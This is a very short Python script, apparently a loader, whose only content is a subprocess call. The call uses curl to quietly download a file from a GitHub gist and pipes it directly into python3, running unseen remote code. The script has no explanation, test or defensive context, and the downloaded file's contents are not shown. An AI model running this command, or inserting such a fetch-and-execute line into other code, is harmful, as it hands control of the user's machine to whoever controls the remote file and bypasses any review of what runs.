import subprocess

subprocess.check_output('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/17ff663cabe17aea2d151953da864fb68c56e578/foo.txt | python3', shell=True, stderr=None)
